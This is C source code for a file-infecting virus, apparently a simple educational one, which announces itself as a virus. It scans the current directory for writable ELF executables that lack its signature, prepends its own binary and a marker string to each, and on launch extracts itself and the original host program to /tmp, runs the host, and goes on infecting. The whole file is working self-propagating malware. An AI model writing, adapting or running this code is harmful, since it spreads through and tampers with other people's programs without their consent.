#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>  // This is required for execvp
#include <dirent.h> // Include for directory handling
#include <libgen.h>  // Include for basename
#include <sys/stat.h>
#include <sys/wait.h> // For waitpid

#define SIGNATURE "Hello World by Heibaiz"
#define SIGNATURE_SIZE (sizeof(SIGNATURE) - 1) // Minus 1 to exclude the null terminator

#define VIRUS_SIZE 18104  // Size of the virus ELF file


long get_file_size(FILE *file) {
	fseek(file, 0, SEEK_END);
	long size = ftell(file);
	fseek(file, 0, SEEK_SET);
	return size;
}

int is_writable(const char *filename){
	FILE * test_file = fopen(filename, "ab");
	if (test_file == NULL) {
		// perror("Error: Lack of privilege to modify the file");
		return 0;
	}
	fclose(test_file);
	return 1;

}

int is_elf_file(const char *filename) {
	FILE *file = fopen(filename, "rb");
	if (file == NULL) {
		perror("Error opening file");
		return 0;
	}

	unsigned char magic[4];
	if (fread(magic, 1, 4, file) < 4) {
		fclose(file);
		return 0; // File is too short to be an ELF file
	}

	fclose(file);

	// Check for ELF magic number: 0x7F 'E' 'L' 'F'
	if (magic[0] == 0x7F && magic[1] == 'E' && magic[2] == 'L' && magic[3] == 'F') {
		// printf("%s is an ELF file.\n", filename);
		return 1; // It's an ELF file
	}
	// printf("%s is not an ELF file.\n", filename);
	return 0; // Not an ELF file
}


int find_signature_in_file(const char *filename, const char *signature, size_t sig_size) {
	FILE *file = fopen(filename, "rb");
	if (file == NULL) {
		perror("Error opening file");
		return -1;
	}

	int found = 0;
	char *buffer = malloc(sig_size);
	if (buffer == NULL) {
		perror("Error allocating memory");
		fclose(file);
		return -1;
	}

	size_t bytes_read;
	while ((bytes_read = fread(buffer, 1, sig_size, file)) == sig_size) {
		if (memcmp(buffer, signature, sig_size) == 0) {
			found = 1;
			break;
		}
		// Move back sig_size - 1 bytes to check overlapping segments
		fseek(file, 1 - sig_size, SEEK_CUR);
	}

	free(buffer);
	fclose(file);

	return found;
}


int infect_binary(const char *inject_elf_path, const char *target_elf_path) {

	FILE *inject_elf = fopen(inject_elf_path, "rb");
	FILE *target_elf = fopen(target_elf_path, "rb");
	if (!inject_elf){
		perror("Error opening inject elf path");
		return 1;
	}

	if (!inject_elf || !target_elf) {
		perror("Error opening files");
		if (inject_elf) fclose(inject_elf);
		if (target_elf) fclose(target_elf);
		return 1;
	}
	long inject_size = get_file_size(inject_elf);
	long target_size = get_file_size(target_elf);

	char *inject_data = malloc(inject_size);
	char *target_data = malloc(target_size);
	if (!inject_data || !target_data) {
		perror("Error allocating memory");
		fclose(inject_elf);
		fclose(target_elf);
		free(inject_data);
		free(target_data);
		return 1;
	}


	fread(inject_data, 1, inject_size, inject_elf);
	fread(target_data, 1, target_size, target_elf);
	fclose(inject_elf);
	fclose(target_elf);

	FILE *output_elf = fopen(target_elf_path, "wb");
	if (!output_elf) {
		perror("Error opening output file");
		free(inject_data);
		free(target_data);
		return 1;
	}


	fwrite(inject_data, 1, inject_size, output_elf);
	fwrite(SIGNATURE, 1, SIGNATURE_SIZE, output_elf);
	fwrite(target_data, 1, target_size, output_elf);

	fclose(output_elf);
	free(inject_data);
	free(target_data);

	// printf("Virus injected to %s successfully.\n", target_elf_path);
	return 0;
}


int execute_binary(const char *binary_name, char *const argv[], int argc) {
	pid_t pid = fork();

	if (pid == -1) {
		// Handle error in fork
		perror("fork failed");
		return -1;
	} else if (pid == 0) {
		// Child process
		char execPath[1024];
		snprintf(execPath, sizeof(execPath), "%s", binary_name);

		char **execArgs = malloc((argc + 1) * sizeof(char *));
		if (execArgs == NULL) {
			perror("Failed to allocate memory");
			exit(EXIT_FAILURE);
		}

		execArgs[0] = execPath;
		for (int i = 0; i < argc; ++i) {
			execArgs[i + 1] = argv[i];
		}
		execArgs[argc + 1] = NULL;

		execvp(execArgs[0], execArgs);
		perror("execvp failed");
		free(execArgs);
		exit(EXIT_FAILURE); // execvp failed, exit child process
	} else {
		// Parent process
		int status;
		waitpid(pid, &status, 0); // Wait for the child process to finish
		return WEXITSTATUS(status); // Return the exit status of the child process
	}
}

int extract_virus(FILE *file, const char *output_path) {
	char virus_buffer[VIRUS_SIZE];

	// Read the virus part
	if (fread(virus_buffer, 1, VIRUS_SIZE, file) != VIRUS_SIZE) {
		perror("Error reading the virus part");
		return 1;
	}

	// Write the virus to the output file
	FILE *virus_file = fopen(output_path, "wb");
	if (virus_file == NULL) {
		perror("Error creating the virus file");
		return 1;
	}
	fwrite(virus_buffer, 1, VIRUS_SIZE, virus_file);
	fclose(virus_file);
	if (chmod(output_path, S_IRWXU | S_IRWXG | S_IRWXO) != 0) {
		perror("chmod failed");
		return 1;
	}
	return 0; // Success
}

int extract_original_binary(FILE *file, const char *output_path) {
	// Skip the signature
	if (fseek(file, SIGNATURE_SIZE, SEEK_CUR) != 0) {
		perror("Error skipping the signature");
		return 1;
	}

	// Write the original binary to the output file
	FILE *original_file = fopen(output_path, "wb");
	if (original_file == NULL) {
		perror("Error creating the original binary file");
		return 1;
	}

	char buffer[1024];
	size_t bytes_read;
	while ((bytes_read = fread(buffer, 1, sizeof(buffer), file)) > 0) {
		fwrite(buffer, 1, bytes_read, original_file);
	}
	fclose(original_file);

	if (chmod(output_path, S_IRWXU | S_IRWXG | S_IRWXO) != 0) {
		perror("chmod failed");
		return 1;
	}
	return 0; // Success
}


int main(int argc, char *argv[]) {

	// Virus Functionality
	printf("Hello! I am a simple virus!\n");

	char tmp_path[1024];

	char *program_name = basename(argv[0]);  // Extract the name of your program
	if (strcmp(program_name, "virus") != 0){  // program name is not virus
		FILE *original_file = fopen(argv[0], "rb");
		if (original_file == NULL) {
			perror("Error opening the original binary file");
			return 1;
		}

		// Extract the virus to /tmp/virus
		if (extract_virus(original_file, "/tmp/virus") != 0) {
			fclose(original_file);
			return 1;
		}

		// Extract the original binary to /tmp/<original_name>
		snprintf(tmp_path, sizeof(tmp_path), "/tmp/virus_%s", program_name);
		if (extract_original_binary(original_file, tmp_path) != 0) {
			fclose(original_file);
			return 1;
		}

		fclose(original_file);

		// Execute original functionality
		// Execute the binary with arguments (excluding the program's own name)    
		execute_binary(tmp_path, &argv[1], argc - 1);

		// system("/tmp/virus");
	}else{  // program name is virus
		// No operation
	}


	// Infect Files
	DIR *d;
	struct dirent *dir;
	d = opendir("."); // Open the current directory

	char cwd[1024];
	getcwd(cwd, sizeof(cwd));
	// printf("Current Working Directory is: %s\n", cwd);

	if (d) {
		while ((dir = readdir(d)) != NULL) {
			if (dir->d_type == DT_REG) { // Check if it is a regular file
				// printf("Scanning file: %s\n", dir->d_name);

        // Skip if the file is the program itself
        if (strcmp(dir->d_name, program_name) == 0) continue;
        				
        // Skip if the file is non writable
				if (! is_writable(dir->d_name)) continue;
        
        // Skip if the file is non ELF
				if ( !is_elf_file(dir->d_name)) continue;
				// printf("Scanning ELF file: %s\n", dir->d_name);

        // Check if the file has been infected already
				int result = find_signature_in_file(dir->d_name, SIGNATURE, SIGNATURE_SIZE);
				if (result == 1) {
				  // printf("Signature already found in %s.\n", dir->d_name);
				} else {
					// printf("Injecting signature into %s.\n", dir->d_name);
					if (strcmp(program_name, "virus") == 0){
				  	infect_binary("./virus", dir->d_name);
					}else{
					  infect_binary("/tmp/virus", dir->d_name);
					}
					return 1;

        // inject_signature(dir->d_name, SIGNATURE, SIGNATURE_SIZE);


						}
			}
		}
		closedir(d);
	}


	if (strcmp(program_name, "virus") != 0){
		remove("/tmp/virus");
		remove(tmp_path);
		// printf("deleted\n");
	}



	return 0;
}
